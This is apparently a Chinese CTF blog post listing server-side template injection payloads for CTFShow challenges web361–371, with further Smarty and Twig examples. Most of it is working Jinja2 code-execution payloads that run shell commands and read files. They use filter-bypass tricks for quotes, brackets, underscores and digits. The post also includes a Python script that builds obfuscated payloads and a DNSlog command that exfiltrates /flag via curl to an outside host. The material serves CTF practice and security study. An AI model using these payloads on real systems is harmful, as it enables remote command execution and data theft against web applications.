---
title: SSTI
date: 2022-01-01 22:21:18
updated: 2023-01-15 22:21:18
tags: [SSTI]
categories: CTFSHOW
toc: true
---
SSTI综合知识
<!-- more -->

根据习题来记录常见的payload

![](https://img-blog.csdnimg.cn/20210626100053239.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDYzMjc4Nw==,size_16,color_FFFFFF,t_70#pic_center)

### 一、CTFShow

#### web361、362

```python
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```

```python
{{ config.__class__.__init__.__globals__['o'+'s'].popen('ls ../').read() }}
{{ config.__class__.__init__.__globals__['o'+'s'].listdir('/') }}
{{config.__class__.__init__.__globals__['__builtins__'].open('app.py','r').read()}}
或者直接用下列方式访问全局变量
url_for.__globals__
lipsum.__globals__
get_flashed_messages.__globals__
```



#### web363过滤引号

`request.args`传参绕过

假设传入``{{ config.__class__.__init__.__globals__['os'] }}``,因为引号被过滤，所以无法执行，可以把'os'换成request.args.a(这里的a可以理解为自定义的变量，名字可以任意设置)

随后在后面传入a的值，变成`{{ config.__class__.__init__.__globals__[request.args.a] }}&a=os`，与原命令等效

```python
{{config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=cat /flag
```



#### web364过滤引号和args传参

尝试使用post传参: form或者value

```
{{config.__class__.__init__.__globals__[request.form.a].popen(request.form.b).read()}}
POST: a=os&b=cat /flag
```

出现 Method Not Allowed

尝试使用cookie传参：(注意cookie是用`;`隔开)

```python
{{config.__class__.__init__.__globals__[request.cookies.a].popen(request.cookies.b).read()}}
a=os;b=cat /flag
```

以上`config.__class__.__init__.__globals__`可替换成`url_for.__globals__`

#### web365过滤中括号

中括号可以换成`.`，因为jinja2对它俩的解析方式其实一样，也可以使用`__getitem__`

```python
{{url_for.__globals__.os.popen(request.cookies.a).read()}}
cookie: a=cat /flag

{{url_for.__globals__.__getitem__(request.cookies.b).popen(request.cookies.a).read()}}
cookie: a=cat /flag;b=os
```



#### web366过滤下划线__

实测发现中括号也被过滤，基于上面题多加了过滤，所以不能使用[request……]的方法过滤

<font color='red'>attr获取变量</font>(不是获取方法)

```python
""|attr("__class__") 相当于
"".__class__
```

配合request使用即可避免使用下划线

```
{{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
cookie: a=__globals__;b=cat /flag
```

注意要把`lipsum|attr(request.cookies.a)`用小括号括起来！



#### web367过滤OS

尝试使用get()替换上题中的os

```
{{(lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()}}
cookie: a=__globals__;b=cat /flag;c=os
```



#### web368过滤了双花括号

用`{% %}`代替，并用print()打印回显

payload: `{%print(上一题payload)%}`



#### web369过滤request

核心payload: 

```python
{% print (lipsum|attr(__globals__)).get(__builtins__).open('/flag').read() %}
```

**字符串拼接：**

```python
'm'+'o'
'm'~'o'
('m','o')|join
['m','o']|join
{'m':a,'o':a}|join
dict(m=a,o=a)|join
```

方法一：

因为下划线被过滤了，`__str__()`用不了，改用过滤器string来输出字符串，然后用过滤器list将其分割输出：

`{% print config|string|list %}` <font color='red'>//将config的内容分隔开来</font>

然后利用`pop()`搭配`lower()`来遍历输出小写字符：`{% print (config|string|list).pop().lower() %}`

![](https://s2.loli.net/2022/01/07/OYBTvnXm2UtrxSw.png)

开始跑脚本，构造之前题的payload

```python
import requests

def mdpl(payload):
    url = "http://da46c882-1036-4900-839a-cae97e794788.challenge.ctf.show/"
    result = ""
    for j in payload:
        for i in range(1000):
            params = {
                'name': "{{% print (config|string|list).pop({}).lower() %}}".format(i)
            }
            r = requests.get(url, params=params)
            # print(r.text.find('<h3>'))
            num = r.text.find('<h3>')+4
            stra = r.text[num]
            if stra == j:
                # print("(config|string|list).pop({}).lower()  ==  {}".format(i, j))
                result += "(config|string|list).pop({}).lower()~".format(i)
                # print(result)
                break
    return result


payload1 = "__globals__"
payload2 = "os"
payload3 = "cat /flag"
end = "{{% print (lipsum|attr({})).get({}).popen({}).read() %}}".format(mdpl(payload1).strip('~'), mdpl(payload2).strip('~'), mdpl(payload3).strip('~'))
print(end)
```

得到payload:

```python
{% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}
```

方法二：

```python
{% set a=dict(o=a,s=a)|join %}
```

这样得到的a就是将该字典的键名拼接后的值，也就是os，这样的拼接无需单引号

```python
{% set a=(config|string|list).pop(74)%}
{% set glob=(a,a,dict(globals=a)|join,a,a)|join() %}
{% set bult=(a,a,dict(builtins=a)|join,a,a)|join() %}
{% set b=(lipsum|attr(glob)).get(bult) %}
{% set chr=b.chr %}
{% print b.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
```



#### web370过滤数字

获取数字的方式：

<font color='red'>第一种：</font>

```python
{}|int # 0
(not{})|int # 1
((not{})|int+(not{})|int) # 2
((not{})|int+(not{})|int)**((not{})|int+(not{})|int) # 4
((not{})|int,(not{})|int)|sum # 2

((not{})|int,{}|int)|join|int # 10
(-(not{})|int,{}|int)|join|int # -10
'aaxaaa'.index('x') # 2
((),())|count/length # 2
((),())|length # 2

{% set two=(dict(cc=z)|join|count) %} # 2，length、count都可以
```

<font color='red'>第二种：也可用全角数字和一些一些 unicode 字符代替正常数字</font>

```
٠١٢٣٤٥٦٧٨٩
𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫
𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡
𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾
𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵
以上皆不是正常的阿拉伯数字
```

拓展：半角转全角代码

```python
def half2full(half):  
 full = ''  
 for ch in half:  
     if ord(ch) in range(33, 127):  
         ch = chr(ord(ch) + 0xfee0)  
     elif ord(ch) == 32:  
         ch = chr(0x3000)  
     else:  
         pass  
     full += ch  
 return full  
t=''
s="0123456789"
for i in s:
 t+='\''+half2full(i)+'\','
print(t)
```

将上题的payload稍加修改即可：

```python
{% set a=(config|string|list).pop(７４)%}
{% set glob=(a,a,dict(globals=a)|join,a,a)|join() %}
{% set bult=(a,a,dict(builtins=a)|join,a,a)|join() %}
{% set b=(lipsum|attr(glob)).get(bult) %}
{% set chr=b.chr %}
{% print b.open(chr(４７)~chr(１０２)~chr(１０８)~chr(９７)~chr(１０３)).read() %}
```



#### web371过滤print

<font color='red'>DNSlog回显带出来</font>

核心payload：

```bash
curl `cat /flag`.3iw6zn.dnslog.cn
```

```
{% set xh=(config|string|list).pop(𝟳𝟰) %}
{% set kg=(()|select|string|list).pop(𝟭𝟬) %}
{% set point=(config|string|list).pop(𝟭𝟵𝟭) %}
{% set xg=(config|string|list).pop(-𝟲𝟰) %}
{% set glob=(xh,xh,dict(globals=a)|join,xh,xh)|join() %}
{% set fxg=((lipsum|attr(glob))|string|list).pop(𝟲𝟰𝟯) %}
{% set geti=(xh,xh,dict(getitem=a)|join,xh,xh)|join() %}
{% set ox=dict(o=z,s=z)|join %}
{% set payload=(dict(curl=a)|join,kg,fxg,dict(cat=a)|join,kg,xg,dict(flag=a)|join,fxg,point,dict(kkshyu=a)|join,point,dict(dnslog=a)|join,point,dict(cn=a)|join)|join %}
{%if ((lipsum|attr(glob))|attr(geti)(ox)).popen(payload)%}{%endif%}
```

最后在回显中查看代码执行情况即可

### 二、其他模板

#### 1.smarty

https://www.freebuf.com/column/219913.html

```
{if phpinfo()}{/if}
```

#### 2.Twig

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

### 三、爆破脚本

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen().read()}}{%endif%}{%endfor%}
```

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if 'warning' in c.__name__ %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if 'warning' in c.__name__ %}{{ c.__init__.__globals__['o'+'s'].listdir('/')}}{% endif %}{% endfor %}
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
